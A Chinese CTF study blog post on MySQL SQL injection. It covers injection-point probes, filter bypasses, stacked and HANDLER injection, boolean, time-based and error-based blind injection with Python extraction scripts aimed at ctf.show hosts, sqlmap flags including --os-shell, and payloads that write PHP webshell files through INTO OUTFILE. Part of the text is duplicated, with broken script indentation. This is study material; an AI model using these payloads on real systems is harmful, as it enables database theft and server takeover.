---
title: SQL 注入：从判断注入点到盲注与堆叠
date: 2026-11-22 08:00:00
author: Xendr1a
categories: [Web安全, Web基础]
tags: [SQL注入, MySQL, CTF]
description: 把散落在笔记里的 SQL 注入内容按「判断—回显—盲注—堆叠—绕过—sqlmap」重排成一条可实操的链路。
toc: true
---

把注入点判断、联合查询、布尔/时间盲注、报错注入、堆叠与 HANDLER、常见过滤绕过和 sqlmap 用法整理成一条完整链路。

## SQL注入

### 注入常见参数

- `user()`：当前数据库用户

- `database()`：当前数据库名
- `version()`：当前使用的数据库版本
- `@@datadir`：数据库存储数据路径
- `concat()`：联合数据，用于联合两条数据结果。如 `concat(username,0x3a,password)`
- `group_concat()`：和 `concat()` 类似，如 `group_concat(DISTINCT+user,0x3a,password)`，用于把多条数据一次注入出来
- `concat_ws()`：用法类似
- `hex()` 和 `unhex()`：用于 hex 编码解码
- `load_file()`：以文本方式读取文件，在 Windows 中，路径设置为 `\`
- `select xxoo into outfile '路径'`：权限较高时可直接写文件

## SQL注入的闭合方式判断与注释

### 一般分为字符形和数字形

```text
字符型：?id=1 参数后加 " ' ")) ")) 单双引号，引号括号等判断页面内容是否会消失
数字型：参数后id=3-1，观察页面是否会改变
列如
?id=1' 
?id=1" 
?id=1') 
?id=1") 
?id=1' or 1#
?id=1' or 0#
?id=1' or 1=1#
?id=1' and 1=2#
?id=1' and sleep(5)#
?id=1' and 1=2 or ' 
?id=1\
```

### 注释

```text
注释符号有#，%23，--+,--%20等，可以换着试，回显正常就行。
```

## Sqlmap使用

#### 常用语句列出当前数据库

cookie注入命令：sqlmap.py -u 注入点 --dbs

#### 指定数据库猜表

Cookie注入命令：sqlmap.py -u 注入点 -D 数据库 --tables

#### 猜字段

Cookie注入命令：sqlmap.py -u 注入点 -D 数据库 -T 表名 --columns

#### 猜字段内容

Cookie注入命令：sqlmap.py -u 注入点 -D 数据库 -T 表名 -C “想破解的字段” --dump

#### 常用参数

```text
--os-shell 获取os交互式shell --sql-shell 获取sql交互式shell

--dbms=mysql 指定sql的数据库

--forms 提交表单测试

--batch 默认选项进行

sqlmap xxx --dbs 列出所有数据库

sqlmap xxx --D [数据库] --tables 列出该数据库的表名

sqlmap xx -D [数据库] --T [表名] --columns 列出素有字段

sqlmap xx -D [数据库] --T [表名] -C [字段] --dump 列出字段的所有内容

--user-agent=xxx 指定UA --referer=xxx 伪装referer

--data "id=1" 传参注入

--method="PUT" 传参方式改变

--cookie="xxx" 更改cookie

--safe-url=xxx 设置在测试目标地址前访问的安全链接 --safe-freq=次数 设置两次注入测试前访问安全链接的次数

--prefix=PREFIX 攻击载荷的前缀 --suffix=SUFFIX 攻击载荷的后缀

--tamper=[内置脚本] 选择内置脚本
```

## 基钞

### 首先

#### 基本操作，要查询数据库表的数据

```text
SELECT * FROM <表名>
```

#### 条件查询的语法

```text
SELECT * FROM <表名> WHERE <条件表达式>
列如
查询分数在60分(含)～90分(含)之间的学生可以使用的WHERE语句是：
 WHERE score >= 60 OR score <= 90
 WHERE score >= 60 AND score <= 90
 WHERE score IN (60, 90)
 WHERE score BETWEEN 60 AND 90
 WHERE 60 <= score <= 90
```

```text
常用的条件表达式
条件	表达式举例1	表达式举例2	说明
使用=判断相等	score = 80	name = 'abc'	字符串需要用单引号括起来
使用>判断大于	score > 80	name > 'abc'	字符串比较根据ASCII码，中文字符比较根据数据库设置
使用>=判断大于或相等	score >= 80	name >= 'abc'	
使用<判断小于	score < 80	name <= 'abc'	
使用<=判断小于或相等	score <= 80	name <= 'abc'	
使用<>判断不相等	score <> 80	name <> 'abc'	
使用LIKE判断相似	name LIKE 'ab%'	name LIKE '%bc%'	%表示任意字符，例如'ab%'将匹配'ab'，'abc'，'abcd'
```

### 投影查询

```text
使用SELECT *表示查询表的所有列，使用SELECT 列1, 列2, 列3则可以仅返回指定列，这种操作称为投影；
```

#### 排序

```text
例如按照成绩从低到高进行排序：
-- 按score从低到高:
SELECT id, name, gender, score FROM students ORDER BY score;
```

## 增删改查

### 插入

```text
INSERT INTO <表名> (字段1, 字段2, ...) VALUES (值1, 值2, ...);
列如
-- 添加一条新记录:
INSERT INTO students (class_id, name, gender, score) VALUES (2, '大牛', 'M', 80);
-- 查询并观察结果:
SELECT * FROM students;
```

### 改

```text
UPDATE <表名> SET 字段1=值1, 字段2=值2, ... WHERE ...;
列如
-- 更新id=1的记录:
UPDATE students SET name='大牛', score=66 WHERE id=1;
-- 查询并观察结果:
SELECT * FROM students WHERE id=1;

UPDATE语句的WHERE条件和SELECT语句的WHERE条件其实是一样的，所以也可以改多条语句
```

### 删除数据

```text
DELETE FROM <表名> WHERE ...;
列如
-- 删除id=5,6,7的记录:
DELETE FROM students WHERE id>=5 AND id<=7;
-- 查询并观察结果:
SELECT * FROM students;
```

## 常见过滤及绕过手法

### 关于空格的绕过

```text
关于空格的绕过
%20 %09 %0a %0b %0c %0d %a0 %00   
注释替换空格：
/**/
括号绕过空格：
如果空格被过滤，括号没有被过滤，也可以用括号绕过。
select*from(flag);     =》select*from flag;
```

### 引号绕过

```text
可以使用16进制绕过
select column_name  from information_schema.tables where table_name="users"
=》
select column_name  from information_schema.tables where table_name=0x7573657273
```

### 逗号绕过（**使用from或者offset**）

```text
select substr ("string",1,3) ==  select substr ("string" from 1 for 3)
select * from users limit 2,1    ==  select * from users limit 1 offset 2 
union select 1,2,3  == select * from users union select * from (select 1)a join (select 2)b join(select 3)c
select ascii (substr (user (),1,1))=114  == select user() like "r%"
```

### 字符串绕过

```text
SELECT 'a' 'd' 'mi' 'n';
SELECT CONCAT('a', 'd', 'm', 'i', 'n');
SELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n');
SELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n');
```

## 堆叠注入

堆叠注入就是将语句堆叠在一起进行查询。

```text
但是有一个使用条件，那就是需要开启mysql_multi_query()，该函数支持多条sql同时执行，用;分隔即可。
```

## HANDLER命令

HANDLER 是 MySQL 和 MariaDB 特有的非标准 SQL 语句。它允许你直接与存储引擎（如 InnoDB, MyISAM）进行交互，绕过 SQL 优化器。

使用 HANDLER 通常分为三步：打开表、读取数据、关闭表。

```text
HANDLER table_name OPEN;      -- 打开表的句柄
HANDLER table_name READ (FIRST/NEXT/索引名 = ('值'));  -- 读取数据  
--HANDLER users READ idx = ('admin');  读取idx索引中值为'admin'的行 
HANDLER table_name CLOSE;     -- 关闭句柄
```

**用途**：  
直接逐行读取表数据，**无需指定列名**，适合探测未知表结构。

### 列题[GYCTF2020]Blacklist1

查1'发现显示

![1b1402b4-7e97-46ef-bd88-c0cf8803c37f-20250225210550-wfp241r](/img/web-sql-injection/img-01.png)

过滤了好多东西，可以使用堆叠注入

试试show tables和show databases，发现FlagHere,(查数据库是一个伏笔

![e7333a66-2f2f-46c2-8a0d-f00700aeaf7a-20250225211001-5hj3a1b](/img/web-sql-injection/img-02.png)

![46a0b497-f705-4e7d-b7fd-f37da8e9fbe9-20250225211244-f8abi8r](/img/web-sql-injection/img-03.png)

slelect因为被过滤了，所以使用handler命令

挨个用库试试,最后试到supersqli，下面就是语句了

```text
?inject=1';                   -- 闭合原查询并结束语句
use supersqli;                -- 切换到数据库 `supersqli`
HANDLER FlagHere OPEN;        -- 打开表 `FlagHere` 的句柄
HANDLER FlagHere READ FIRST;  -- 读取表的第一行数据
HANDLER FlagHere CLOSE;       -- 关闭句柄
```

**完整拼接后的SQL**（假设原查询为`SELECT * FROM table WHERE id='用户输入'`）：

```text
SELECT * FROM table WHERE id='1';
USE supersqli;
HANDLER FlagHere OPEN;
HANDLER FlagHere READ FIRST;
HANDLER FlagHere CLOSE;
```

### 例题ctfshowweb225

![daa1ecd4-ad0e-44e7-8279-8352e2cb5ea7-20251223143153-iejsas2](/img/web-sql-injection/img-04.png)

前三部分用show拿信息

```text
username=';show%20databases;
username=';show%20tables%20from%20ctfshow_web; 
username=';show%20columns%20from%20ctfshow_web.ctfshow_flagasa; 
```

禁用了select，我们用handler来读取

```text
username=';handler%20ctfshow_flagasa%20open;handler%20ctfshow_flagasa%20read%20first;HANDLER%20ctfshow_flagasa%20CLOSE;
```

## 布尔盲注

当存在SQL注入时，攻击者无法通过页面或请求的返回信息、回显获得SQL注入语句的执行结果。可以利用返回执行结果的True或False，来判断注入语句是否执行成功。

```text
substr(str,start,len)截取字符串，start表示截取字符串的开始位，len表示截取长度。
ascii()返回字符串的ascii值。

AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
```

```text
查数据库
id=1' and ascii(substr(database(),1,1))>0--%20

查表名
id=1' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>0--%20

查列名
id=1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=table),1,1))>0--%20

查数据
id=1' and ascii(substr((select group_concat(column) from table),1,1))>0--%20
```

祖传脚本

```text
import requests
import sys
import time

url = "http://c5f6403a-b365-4e18-9aa8-45c52d21e570.challenge.ctf.show/api/"
flag = ""
for i in range(1,60):
    max = 127
    min = 32
    while 1: 
        mid = (max+min)>>1
        if(min == mid):
            flag += chr(mid)
            print(flag)
            break
        #payload = "admin'and (ascii(substr((select database()),{},1))<{})#".format(i,mid)
        #ctfshow_web
        #payload = "admin'and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))<{})#".format(i,mid)
        #ctfshow_fl0g
        #payload = "admin'and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'),{},1))<{})#".format(i,mid)
        #id,f1ag
        payload = "admin'and (ord(substr((select f1ag from ctfshow_fl0g),{},1))<{})#".format(i,mid)

        data = {
            "username":payload,
            "password":0,
        }
        res = requests.post(url = url,data =data)
        time.sleep(0.3)
        if res.text.find("8bef")>0:
            max = mid
        else:
            min = mid
```

## 手注入的基巢

### 手工注入获取数据库等信息

```text
普通语句：schema_name——数据库名；table_name——表名；column_name——字段名；

查数据库
查询所有数据库(一行返回)： 
select group_concat(schema_name) from information_schema.schemata

查询所有数据库：
select schema_name from information_schema.schemata limit 0,1 //limit 0,1 表示从查询，限制一行

查询当前使用的数据库: 
select database()#

查数据库中的表
查询当前数据库所有的表：
select table_name from information_schema.tables where table_schema='数据库名' limit 0,1# //limit 表示从第一个开始，一共返回一行

查询当前数据库所有的表(一行返回): 
select group_concat(table_name) from information_schema.tables where table_schema=database()

查询指定数据库所有的表(一行返回): 
select group_concat(table_name) from information_schema.tables where table_schema='数据库名'

查询所有数据库所有的表(一行返回): 
select group_concat(table_name) from information_schema.tables

从表中查字段
查询所有字段名：
select column_name from information_schema.columns where table_name='表名' limit 0,1# //limit 0,1 表示从从第一个开始查，一共返回一行

从表查询所有字段(一行返回)： 
select group_concat(column_name) from information_schema.columns where table_name='表名'

从字段查询所有数据
从字段查询所有数据(一行返回): 
select group_concat(字段1,字段2) from 表名

查询当前数据库字段内容：
select * from 表名#

查询指定数据库的表: 
select group_concat(字段名) from 数据库.表名
```

## 报错注入

#### 两种报错注入，extractvalue 和 updatexml

```text
select extractvalue(1,concat(0x7e,( 填入想执行的sql语句 ),0x7e)) 
select updatexml(1,concat(0x7e,( 填入想执行的sql语句 ),0x7e),1) 
```

```text
-- 在5.1.5版本中成功
AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)
-- MySQL 5.1版本修复了
AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name FROM information_schema.columns LIMIT 1)));
```

## 时间盲注

```text
就是利用sleep来探查网页反应时间来判断正确与否
1' and '1' = '1与1' and '1' = '2来判断是否存在盲注，若两者回显信息不同，则可判断是否存在盲注
可以手工先测测比如数据库length(database())=8--+
```

```text
sleep()函数，设置页面响应时间。
substr(str,start,len)截取字符串，start表示截取字符串的开始位，len表示截取长度。
ascii()返回字符串的ascii值。
```

语句

```text
猜数据库长度：
payload = "?id=1' and if(length(database())>%s,sleep(2),0) --+" %i

猜数据库名字：
payload = "?id=1' and if(substr(database(),%d,1)='%s',sleep(3),1) --+" % (i,j)

猜表名：
payload = "?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1))=%d,sleep(3),0) --+" % (k, i, j)

猜列名：
payload = "?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_name='%s' and table_schema=database() limit %d,1),%d,1))=%d,sleep(3),0) --+" % (table_name, k, i, j)

爆数据：
payload = "?id=1' and if(ascii(substr((select %s from %s limit %d,1),%d,1))=%d, sleep(2),0)--+" % (column,table,k,i,j)
```

依旧是祖传板子

```text
import requests

url = "http://fc3fcea0-d121-48f0-9300-01ca030b7784.challenge.ctf.show/api/index.php"
out = ''
dic = '{-}0123456789abcdefghijklmnopqrstuvwxyz_'
for j in range(1, 50):
    print(j)
    for k in dic:
        payload=f"if(substr((select flaga from ctfshow_flagx), {j}, 1) = '{k}',sleep(3),0)"
        data= {'debug': '1','ip': payload}
        re = requests.post(url, data=data)
        if re.elapsed.total_seconds()>2:
            out += k
            print(out)
            break
```

## SQL注入拼接语句

[https://blog.csdn.net/2401_83582688/article/details/144500253](https://blog.csdn.net/2401_83582688/article/details/144500253)

过滤了 select 和 where 的情况下，还可以使用 show 来爆出数据库名，表名，和列名

开头可能会用到的提醒  
如果空格被过滤，/**/ ` %0b(tab) %09(tab) %0d(回车) %0a(换行) %0c(换页)

语句中 or 和 || 为同种意思

测试有几位可以用order by [几位] 来测试，如果没报错说明位数包含，如果报错说明位数不包含

union select被过滤可以使用union all select

where不能用，使用having

联合查询例子：select user,password from user where id=1 union select user,password from user where id=2

把一个查询到的数据给hex或者base64，union select id,hex/to_base64(username),password from user where username='flag'

base64加解密：to_base64("")/from_base64("")

写入文件，union select 1,"<?php phpinfo(); ?>" into outfile '路径'

读取文件 union select 1,load_file('/var/www/html/flag.php'),3

sql注入对后面的语句注释可以用%23 或 --+

延时注入，如果读取文件，可以用load_file('文件名')

常见的闭合，' " ') ") ')) 空格

宽字节注入漏洞， %df、%81、%E6、�均可绕过.问题代码 mysql_query("SET NAMES gbk");

这几个字符串在md5加密后，放到hex十六进制中，生成的字符串带'，在部分场景可以闭合使用: ffifdyop | e58 | 4611686052576742364

如果筛选条件的双引号和单引号无法使用，可以变为Hex代替。

例如: select id from user union select group_concat(table_name) from information_schema.tables where table_schema="sibei"; 变为: select id from user union select group_concat(table_name) from information_schema.tables where table_schema=0x7369626569;

反引号绕过，例如information_schema.tables和information_schema `tables`都可以使用

写Shell的几种方式  
1：union select 写入 select * from stu where id=1 union select 1,2,'<?=phpinfo();?>' into outfile '/var/www/html/1.php'-- -

lines terminated by 写入（在行末尾写入） select * from stu where id=1 into outfile '/var/www/html/1.php' lines terminated by '<?php phpinfo() ?>'-- -

3.lines starting by 写入（在行头写入） select * from stu where id=1 into outfile '/var/www/html/1.php' lines starting by '<?php phpinfo() ?>'-- -

4.fields terminated by 写入（在每个字段后写入） select * from stu where id=1 into outfile '/var/www/html/1.php' fields terminated by '<?php phpinfo() ?>'-- -

5.columns terminated by 写入（在每个字段后写入） select * from stu where id=1 into outfile '/var/www/html/1.php' columns terminated by '<?php phpinfo() ?>'-- -

手工注入获取数据库等信息  
普通语句：schema_name——数据库名；table_name——表名；column_name——字段名；

查数据库  
查询所有数据库(一行返回)： select group_concat(schema_name) from information_schema.schemata

查询所有数据库：select schema_name from information_schema.schemata limit 0,1 //limit 0,1 表示从查询，限制一行

查询当前使用的数据库: select database()#

查数据库中的表  
查询当前数据库所有的表：select table_name from information_schema.tables where table_schema='数据库名' limit 0,1# //limit 表示从第一个开始，一共返回一行

查询当前数据库所有的表(一行返回): select group_concat(table_name) from information_schema.tables where table_schema=database()

查询指定数据库所有的表(一行返回): select group_concat(table_name) from information_schema.tables where table_schema='数据库名'

查询所有数据库所有的表(一行返回): select group_concat(table_name) from information_schema.tables

从表中查字段  
查询所有字段名：select column_name from information_schema.columns where table_name='表名' limit 0,1# //limit 0,1 表示从从第一个开始查，一共返回一行

从表查询所有字段(一行返回)： select group_concat(column_name) from information_schema.columns where table_name='表名'

从字段查询所有数据  
从字段查询所有数据(一行返回): select group_concat(字段1,字段2) from 表名

查询当前数据库字段内容：select * from 表名#

查询指定数据库的表: select group_concat(字段名) from 数据库.表名

时间盲注专题  
原理: 可以执行sql语句，但是没有回显。那么可以用sql中的substr来检测有没有想要的字符，从而达到爆库

语句拆分详细if(substr((放入sql查询语句),从哪开始找,一共找几位)='substr结果是什么字符',成功执行这个,失败执行这个)

各种盲注查询  
找到当前的在用的数据库  
select if(substr((select database()),1,1)='s',sleep(3),1);

找所有的表  
select if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),需要找的下标,1)='需要找的字符',sleep(2),1)

找到表中所有的字段名称  
select if(substr((select group_concat(column_name) from information_schema.columns where table_name='你想看的表名' and table_schema=database()),需要找的下标,1)='你想找的字符',sleep(3),1)

从字段中找到想要的数据  
select if(substr((select group_concat(你想看的字段1,你想看的字段2) from 你想看的表名表名),需要找的下标,1)='想要找的字符',sleep(3),1);

例子脚本  
重点:为什么要使用timeout，timeout是最大延迟时间，是客户端到服务器到客户端的，如果和延时注入的时间相同，那么延时了，是一定比timeout是一定不够的，所以会执行except import requests

url = "http://1ffa162f-51a1-4516-9904-03b03f4d641e.challenge.ctf.show/index.php?action=check&username=" payload = "" end = "&password=1" string = "}abcdefghljkimnopqrstuvwxyz0123456789,_-@{"

def get_tablename():

ret = ''  
for x in range(1, 10):  
    for y in string:  
        payload = "') union select if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1)='{}',sleep(3),1)  --+".format(  
            x, y)  
        try:  
            req = requests.get(url + payload + end, timeout=3)  
        except:  
            ret += y  
            print(ret)  
def get_columns():

ret = ''  
for x in range(1, 20):  
    for y in string:  
        payload = "') union select if(substr((select group_concat(column_name) from information_schema.columns where table_name='flag' and table_schema=database()),{},1)='{}',sleep(2),1) --+".format(  
            x, y)  
        try:  
            #print(url + payload + end)  
            req = requests.get(url + payload + end, timeout=2)  
        except:  
            ret += y  
            print(ret)  
def get_dump():

ret = ''  
for x in range(1, 50):  
    for y in string:  
        payload = "') union select if(substr((select group_concat(flag) from flag),{},1)='{}',sleep(2),1) --+".format(  
            x, y)  
        try:  
            # print(url + payload + end)  
            req = requests.get(url + payload + end, timeout=2)  
        except:  
            ret += y  
            print(ret)  
if name == 'main':

## 获取表名

#get_tablename()

## 获取字段名

#get_columns()  
#获取字段的列数据  
get_dump()  
自己写的脚本  
import requests

url = "http://7f378bf4-ff73-43ee-98c8-781a38f926f1.challenge.ctf.show/api/v4.php?id="

string = "}abcdefghijklmnopqrstuvwxyz,_0123456789-{" if name == 'main':

result = ''  
for i in range(1, 48):  
    for j in string:  
        # 获取当前所用的数据库数据库  
        # end = " ' union select 'q',if(substr((select database()),{},1)='{}',sleep(5),1); --+".format(i, j)  
        # 获取所有的数据库数据库  
        # end = " ' union select 'q',if(substr((select group_concat(schema_name) from information_schema.schemata),{},1)='{}',sleep(5),1); --+".format(i, j)

\# ------------------------------------------------------------------------------#

\# 获取指定数据库的所有表  
        # end = " ' union select 'q',if(substr((select group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web'),{},1)='{}',sleep(5),1) --+".format(i, j)

\# 获取指定表中的字段名  
        # end = " ' union select 'q',if(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_user4'),{},1)='{}',sleep(5),1) --+ ".format(i, j)

#获取指定数据库中的表中的所有字段下的数据

end = "' union select 'q',if(substr((select group_concat(password) from ctfshow_web.ctfshow_user4),{},1)='{}',sleep(5),1) --+ ".format(i, j)

try:  
            req = requests.get(url + end, timeout=5)  
        except:  
            result += j  
            print(f'[+] {result}')  
            break  
报错注入专题  
两种报错注入，extractvalue 和 updatexml  
select extractvalue(1,concat(0x7e,( 填入想执行的sql语句 ),0x7e)) select updatexml(1,concat(0x7e,( 填入想执行的sql语句 ),0x7e),1) 执行的sql语句参照本文开头记录的语句

Sqlmap使用  
常用语句  
列出当前数据库

cookie注入命令：sqlmap.py -u 注入点 --dbs

指定数据库猜表

Cookie注入命令：sqlmap.py -u 注入点 -D 数据库 --tables

猜字段

Cookie注入命令：sqlmap.py -u 注入点 -D 数据库 -T 表名 --columns

猜字段内容

Cookie注入命令：sqlmap.py -u 注入点 -D 数据库 -T 表名 -C “想破解的字段” --dump

常用参数  
SQLMAP_使用文档(中文) .pdf

--os-shell 获取os交互式shell --sql-shell 获取sql交互式shell

--dbms=mysql 指定sql的数据库

--forms 提交表单测试

--batch 默认选项进行

sqlmap xxx --dbs 列出所有数据库

sqlmap xxx --D [数据库] --tables 列出该数据库的表名

sqlmap xx -D [数据库] --T [表名] --columns 列出素有字段

sqlmap xx -D [数据库] --T [表名] -C [字段] --dump 列出字段的所有内容

--user-agent=xxx 指定UA --referer=xxx 伪装referer

--data "id=1" 传参注入

--method="PUT" 传参方式改变

--cookie="xxx" 更改cookie

--safe-url=xxx 设置在测试目标地址前访问的安全链接 --safe-freq=次数 设置两次注入测试前访问安全链接的次数

--prefix=PREFIX 攻击载荷的前缀 --suffix=SUFFIX 攻击载荷的后缀

--tamper=[内置脚本] 选择内置脚本

案例  
基础  
select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1; 答案 传入999' or id ='26

去掉空格成功执行的实例  
select id,username,password from user where id='111'union select'1',(selectpasswordfromuserwhereid='2'),3;

使用like绕过的实例  
select id,username,password from user where username like '%fla%';

使用group by xx筛选出列名出现次数 并且使用regexp匹配有没有关键词  
select count(*) from user group by pass having pass regexp(0x xxxx);

先将pass出现的个数有几种回显出来，然后使用regexp来匹配

如果一个数据使用了md5($_POST['password'],true);  
//拼接sql语句查找指定ID用户 $sql = "select count(*) from ctfshow_user where username = '$username' and password= '$password'"; $username = $POST['username']; $password = md5($POST['password'],true);

当password传入ffifdyop,md5("ffifdyop",true)，返回的二进制存在'or'6，存在sql注入

sql语句，where后面的语句如果不使用单引号  
select pass from ctfshow_user where username = 0;

本句的username如果不用""，那么查询的时候会将所有数据回显

## 关于information_schema的绕过方式

[https://blog.51cto.com/u_15057807/4564807](https://blog.51cto.com/u_15057807/4564807)

```text
一：sys.schemma

限制：

mysql ≥ 5.7版本

般要超级管理员才可以访问sys

payload:

?id=-1' union all select 1,2,group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()--+

?id=-1' union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+

?id=-1' union all select*from (select * from users as a join users b)c--+ #获取第一列的列名

?id=-1' union all select*from (select * from users as a join users b using(id,username))c--+ #获取次列及后续列名

二：无列名注入

(select `2` from (select 1,2,3 union select * from table_name)a) #前提是要知道表名

((select c from (select 1,2,3 c union select * from users)b)) #1，2，3是因为users表有三列，实际情况还需要猜测表的列的数量

#11'union/**/select/**/1,(select/**/group_concat(`3`)/**/from(select/**/1,2,3/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21'

三：innodb引擎

限制：

mysql ≥ 5.5版本

mysql.innodb_table_stats 或 mysql.innodb_table_index 存放所有库名，表名

select group_concat(table_name) from mysql.innodb_table_stats

select table_name from mysql.innodb_table_stats where database_name=库名
```

## 堆叠注入（续）

Stacked injections(堆叠注入)从字面上就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在 mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。

这玩意就叫做 stacked  injection

堆叠注入的常用语句  
SHOW:

```text
SHOW命令用于显示数据库中的元数据信息，例如数据库、表、列、索引等的信息。常见的SHOW命令包括：
SHOW DATABASES：显示所有数据库。
SHOW TABLES：显示指定数据库中的所有表。
SHOW COLUMNS FROM table_name：显示指定表中的所有列。
SHOW INDEX FROM table_name：显示指定表中的所有索引。
```
